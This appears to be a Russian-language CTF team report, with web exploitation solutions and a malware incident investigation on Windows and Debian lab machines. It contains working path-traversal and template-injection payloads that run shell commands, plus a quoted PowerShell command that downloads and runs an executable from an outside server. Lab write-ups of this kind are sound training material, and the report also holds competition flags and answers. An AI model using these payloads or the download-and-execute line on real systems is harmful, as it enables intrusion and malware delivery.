# Отчёт команды "The Vermillion Team" (No. 26)
## Part 1. Наступательная кибербезопасность.

### Web-10

В этом задании представлена обычная уязвимость **Path Traversal**. На бэкенде можно подгружать любые файлы.
```
GET /download?file_type=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fsecret HTTP/1.1
Host: 192.168.12.10:5001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://192.168.12.10:5001/
Upgrade-Insecure-Requests: 1
```

Флаг: `nto{P6t9_T77v6RsA1}`


### Web-20

В этом задании пейлоад работает через Spring View Manipulation + SSTI под thymeleaf. Соответственно:
```
GET /doc/__%24%7Bnew%20java.util.Scanner%28T%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22cat%20password.txt%22%29.getInputStream%28%29%29.next%28%29%7D__%3A%3A.x. HTTP/1.1
Host: 192.168.12.13:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

Отсюда получаем наш пароль и следующим запросом получаем флаг.
```
GET /login?password=33a61c66899af2114c8f98d80ceb2857 HTTP/1.1
Host: 192.168.12.13:8090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

Флаг: `nto{abobovichasdfas}`

### Web-30

В этом задании есть фильтр, отсеивающий запросы, начинающиеся с `/flag`. Через // обходим данную проверку. Дальше код в любом случае выполнит наш код независимо от того, содержатся в нем запрещенные символы или нет.
```
GET //flag?name={%7b+self.__init__.__globals__.__builtins__.__import__('os').popen('cat+flag.txt').read()+}} HTTP/1.1
Host: 192.168.12.11:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Upgrade-Insecure-Requests: 1
```

Флаг: `nto{Ht1P_sM088Lin6_88Ti}`


## Part 2. Расследование инцидента.

### Виртуальная машина на ОС "Windows 10"

#### 1. Каким образом вредоносное ПО попало на компьютер пользователя? (5 PTS)

Согласно легенде, файл был отправлен Валере незнакомцем. Можно утверждать, что ВПО попало на компьютер пользователя в результате **фишинга** (человеческого фактора).

#### 2. С какого сервера была скачана полезная нагрузка? (5 PTS)

Рассмотрим журнал логирования событий Windows. В ходе поиска по ключевому слову `http://` мы нашли следующее вхождение:
```
ProviderName=FileSystem NewProviderState=Started SequenceNumber=7 HostName=ConsoleHost HostVersion=5.1.19041.906 HostId=9da22629-af52-4b50-a1e3-c0b8ad39c1a1 HostApplication=powershell -command ($drop=Join-Path -Path $env:APPDATA -ChildPath Rjomba.exe);(New-Object System.Net.WebClient).DownloadFile('http://95.169.192.220:8080/prikol.exe', $drop); Start-Process -Verb runAs $drop EngineVersion= RunspaceId= PipelineId= CommandName= CommandType= ScriptName= CommandPath= CommandLine=
```

Cледовательно, файл был скачан с сервера `95.169.192.220`.

#### 3. С помощью какой уязвимости данное ВПО запустилось? В каком ПО? (5 PTS)

При помощи CVE на WinRAR, выполняющейся в cmd.

#### 4. Какие методы противодействия отладке использует программа? (10 PTS)

Встроенные функции (`IsDebuggerPresent()`, `CheckRemoteDebuggerPresent()`) для проверки присутствия отладчика, TLS Callbacks (`TlsAlloc()`, `TlsGetValue()`, `TlsSetValue()`).

#### 5. Какой алгоритм шифрования используется при шифровании данных? (10 PTS)

Откроем файл вируса по пути `…/AppData/Roaming/Rjomba.exe`. В нем при использовании команды `binwalk` можно обнаружить `AES S-BOX` и `INVERSE AES S-BOX`. При поиске в обычном текстовом редакторе можно натнуться на сообщения про некорректное использование Cipher Mode. Перебором всех главных режимов работы AES находим упоминание **CBC** (Cipher Block Chaining). Нетрудно обнаружить и поле с упоминанием длины шифроключа (**256** бит). Значит, при шифровании данных использовался протокол *AES-CBC-256*.

#### 6. Какой ключ шифрования используется при шифровании данных? (25 PTS)

Значение ключа шифрования хранится в памяти, следовательно, чтобы получить ключ, необходимо осуществить дамп памяти. Одним из инструментов, которые могут помочь нам с этим, является **Process Explorer**. Установим его и перебросим на виртуальную машину. Чтобы избежать антиотладки, переименуем тулзу и запустим Rjomba.exe. Сделаем дамп памяти процесса rjomba.exe. Дальше в этом дампе найдем строки, похожие на ключ (длиной 32):
```bash
strings Rjomba111.dmp | grep -x '.\{32,32\}'
```
Находим значение `amogusamogusamogusamogusamogusam`. Чтобы найти вектор инициализации, сделаем поиск по этой строке:
```bash
strings Rjomba111.dmp | grep -x '.\{16,32\}'
```
\- и найдём вектор иницилизации: `abababababababab`.

#### 7. Куда злоумышленник отсылает собранные данные? Каким образом он аутентифицируется на endpoint? (20 PTS)

В том же дампе находим вебхуки `Telegram`. Злоумышленник отсылает собранные данные именно туда, а на endpoint аутентифицируется посредством токена.

#### 8. Каково содержимое расшифрованного файла pass.txt на рабочем столе? (40 PTS)

Зная значение ключа, вектора инициализации и значение пароля, возможно однозначно расшифровать сообщение. При помощи инструмента CyberChef получаем итоговый ответ: ```sFYZ#2z9VdUR9sm`3JRz```.

### Виртуальная машина на ОС "Debian"

#### 1. Какой сервис на данном сервере уязвим? Какая версия? (20 PTS)

По пути `/opt/gitlab/` на диске расположен уязвимый **gitlab**. В файле **version-manifest.txt** указана его версия (15.2.2). Следовательно, ответом является `Gitlab v15.2.2`. 

#### 2. Какой тип уязвимости использовал злоумышленник? (20 PTS)

Под сервис Gitlab существует "authenticated RCE vulnerability" `CVE-2022-2884`, злоумышленник воспользовался именно ею. (Ссылка для ознакомления: [тут](https://github.com/m3ssap0/gitlab_rce_cve-2022-2884))

#### 3. Какие ошибки были допущены при конфигурации сервера? (20 PTS)

...


#### 4. Как злоумышленник повысил привилегии? (20 PTS)

...


#### 5. Как злоумышленник получил доступ к серверу на постоянной основе? (20 PTS)

...

#### 6. Как злоумышленник просканировал систему? (10 PTS)

...

#### 7. С помощью какого ВПО злоумышленник закрепился на сервере? (10 PTS)

...

